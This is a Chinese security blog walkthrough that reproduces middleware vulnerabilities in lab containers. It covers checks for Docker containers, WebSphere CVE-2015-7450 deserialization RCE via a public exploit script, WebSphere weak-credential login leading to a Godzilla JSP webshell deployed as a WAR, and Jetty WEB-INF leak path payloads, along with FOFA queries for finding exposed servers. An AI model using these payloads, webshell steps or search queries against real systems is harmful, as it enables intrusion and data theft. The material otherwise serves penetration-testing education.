#  中间件安全-CVE漏洞复现-Docker+Websphere+Jetty   
原创 兰陵猪猪哼  小黑子安全   2024-04-09 07:42  
  
中间件-Docker  
  
Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP，就可以返回一个宿主机的高权限Shell，并拿到宿主机的root权限，可以直接操作宿主机文件。 它从容器中逃了出来，因此我们形象的称为Docker逃逸漏洞。  
  
判断拿下的  
shell  
是否是  
docker  
容器：  
  
判断是否存在.dockerenv文件  
  
命令：ls -alh /.dockerenv  
  
查询是否有系统进程的cgroup信息：  
  
命令：cat /proc/1/cgroup  
  
演示：拿下的是宿主机，执行报错，系统进程中没有  
docker  
等关键字  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV0r7QicjFrlyiaUica4z1dTCe3Q9giclMZRr7ZrdJYMvKHpcYXfX10RrNOw/640?wx_fmt=png&from=appmsg "")  
  
演示：拿下的是  
docker  
容器，有正常数据回显，系统进程中有  
docker  
等关键字  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVkAATh4I79Ey49nWAss9hd7DJDDCwXhhEvYtmXB9NwZ9oXTE63ZibIbQ/640?wx_fmt=png&from=appmsg "")  
  
如果拿下的  
shell  
是  
docker  
容器的，就要进行  
docker  
逃逸来获取宿主机  
shell  
，因为在  
docker  
容器执行命令影响不到宿主机。虽然  
docker  
容器是搭建在宿主机上的，但是  
docker  
容器就像是一个独立的虚拟系统一样，在这个独立虚拟系统中执行命令无法影响到另一个真实系统  
(  
宿主机  
)  
  
举个栗子：在  
docker  
容器执行一个在  
home  
目录下创建一个  
1.txt  
文件的命令，查看  
home  
目录成功生成  
1.txt  
，但是在宿主机的  
home  
目录下并不会生成一个  
1.txt  
文件  
  
案例：中间件-WebSphere  
  
   
WebSphere  
   
Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰 富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。  
  
WebSphere端口  
  
端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口、9060—管理后台访问端口、9043—管理控制台安全端口、8880—SOAP连接器端口等等。  
  
漏洞探测在8880端口，后台是9060端口，解析是9080端口  
  
案例演示：  
CVE-2015-7450 反序列化  
  
fofa  
语法：  
"websphere" &&
server=="WebSphere Application Server/7.0" &&
port="8880"  
  
漏洞环境使用  
docker  
自行搭建，  
vulhub  
和  
vulfocus  
都没有此中间件漏洞  
  
拉取镜像：docker pull iscrosales/websphere7  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV7us8LBdbYrEk92R2hPfEVr24wkH5YSYoS9GFJSZOeNyToRYYCia7hwg/640?wx_fmt=png&from=appmsg "")  
  
启动镜像：docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7  
  
停止镜像：docker stop $(docker ps -aq)  
  
启动漏洞环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVvLoIa6qXYP0McRs7iblNRGK37Yg9mXXicNduicqS01LAqWzMOibeOQdaDg/640?wx_fmt=png&from=appmsg "")  
  
直接使用脚本拿捏：  
https://github.com/Coalfire-Research/java-deserialization-exploits/tree/main/WebSphere  
  
使用  
python2  
运行脚本  
  
命令：  
python
websphere_rce.py   
目标  
ip  
:8880 "  
命令  
"  
 --  
proto   
指定请求方式  
(http/https(  
默认  
))  
  
ping dns  
平台，根据解析记录判断命令是否被执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVDmodXV3ibBRKpfJaV4IxhUeQDpBbibZ1pHaE7GZgxvzibOND1am5zhnTA/640?wx_fmt=png&from=appmsg "")  
  
平台产生  
dns  
解析记录，命令成功执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVqGM8kIZKtItjZLTc8tAia1yLrkeRqU4lH2c7GYibiatDshp7lwT4ftbFg/640?wx_fmt=png&from=appmsg "")  
  
案例演示：弱口令 上传功能拿Shell  
  
产生：在6.x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。  
  
fofa  
语法：  
"websphere" &&
server=="WebSphere Application Server/7.0" &&
port="9060"  
  
访问漏洞环境的  
/ibm/console/  
目录即可进入  
WebSphere管理控制台登录接口  
  
利用弱口令登录，常用弱口令：  
  
websphere/websphere  
        
system/ manager  
  
输入  
admin  
成功登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVIPsjReTCFekzb5oqqmFaF7BwNwmUxzwH4h5kutViaKxzzHxK3gCss7Q/640?wx_fmt=png&from=appmsg "")  
  
来到控制台，如下图依次点击——然后点击  
install  
来到文件上传功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVCn48xf64ElSgibquPtKrsqPvweAOGVOZgOyyl1MRGnjLqdGGkd8cUng/640?wx_fmt=png&from=appmsg "")  
  
使用哥斯拉生成  
jsp  
后门文件  
  
哥斯拉：  
https://github.com/BeichenDream/Godzilla  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVWCaAShHWrhlARavtCcyHGKl1J3eXTTbiarMhe2JxZriaj7uzZiaqXhpjw/640?wx_fmt=png&from=appmsg "")  
  
制作  
war  
压缩文件：将生成的  
jsp  
压缩为  
zip  
，再将  
zip  
重命名为  
war  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV8JcvD5zoYicYCYn7UtJJQgIIudThZTea0SGvq7lJYn6hCOib5M6xiaZOA/640?wx_fmt=png&from=appmsg "")  
  
将制作的  
war  
文件上传，点击  
Next  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV5xLcaRGpiaXuy3QZHeZvWO8XK0ubXd8qVibaIh30kcwX9P9mN2ibctYjA/640?wx_fmt=png&from=appmsg "")  
  
一直点击  
N  
ext  
，直到下图设置访问路径，我设置为  
shell  
，点击  
Next  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVhtWMicbbgSEZWicMgDjxmnxs4KTdTvIAwibEFQiaiczTf73ickZw9iaDqOgVQ/640?wx_fmt=png&from=appmsg "")  
  
点击  
F  
inish,  
等待加载完毕，点击  
Save  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV2dyOzFd2ByWtnSOKtLyuKFjjzIqEnVpZOqJwE1YMxW8N716k79hF5g/640?wx_fmt=png&from=appmsg "")  
  
选择上传的文件，点击  
S  
tart  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEV6uLVuibrQxRaQOHspBmZKo0ztII6PqdaWD1W0ciamA8rOkRUsvVfuLWA/640?wx_fmt=png&from=appmsg "")  
  
成功开启  
shell.war  
文件访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVxg9JhYGB1KD7vcFz3f13A40QZrz4TV80zfa45nuKz7sKvtYUJ3Hvgg/640?wx_fmt=png&from=appmsg "")  
  
访问文件需要到特定的访问端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口  
  
我的是  
http  
协议，所以使用  
9080  
端口访问文件  
  
后门地址：  
http://  
目标  
ip  
:9080/shell/shell.jsp  
   
  
使用哥斯拉连接后门  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEViaKqrGEdtrTdVQy5dO69F7NjyzKTqdQ4TJDsLmhTjEwXt70GJGa44JQ/640?wx_fmt=png&from=appmsg "")  
  
对添加的目标右键——进入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVXZnvTZsZ2cib34Pyah2WfKxFia6CibjdyoG1zJryKYwQ9u6xcYdCHJFIQ/640?wx_fmt=png&from=appmsg "")  
  
进入命令执行终端，成功获取  
shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVGGZgdWicJzibH6aibwmMRVBO3b0ic1Xf4hrFPvCaLysPxOCPloO8mC4w6A/640?wx_fmt=png&from=appmsg "")  
  
案例演示：中间件-Jetty-敏感信息泄露  
  
Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。  
  
CVE-2021-28164  
  
信息泄露路径：http://目标  
ip  
:端口/%2e/WEB-INF/web.xml  
  
CVE-2021-28169  
  
信息泄露路径：http://目标  
ip  
:端口/static?/WEB-INF/web.xml  
  
CVE-2021-34429  
  
信息泄露路径：http://目标  
ip  
:端口/%u002e/WEB-INF/web.xml  
  
使用  
vulfocus  
靶场复现CVE-2021-34429  
  
开启漏洞环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVictr0BY27pBXaEjj0ShDIyjtUItTQmlgrQe1IEJ8cAySbNicBSQ9Oe1w/640?wx_fmt=png&from=appmsg "")  
  
直接访问信息泄露路径，成功获取敏感信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b9ibb0kbHCIkzcpoAcL1noxBRCZxDPvEVC51DnYRPda0Iyia9JxUDJAwH4ZCHBklOhWruns4Xn1GfQ7hgGztB31w/640?wx_fmt=png&from=appmsg "")  
  
网络安全技术交流群：wx加我好友，备注“进群”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9ibb0kbHCImS2ldibAAaXVDGRKsYsrwDjQmnYKiauv2Vz2eknbKu3CoVokgYhb09xbGUpBxLqSVsdJBDmic1oiclmA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
QQ群：708769345  
  
  
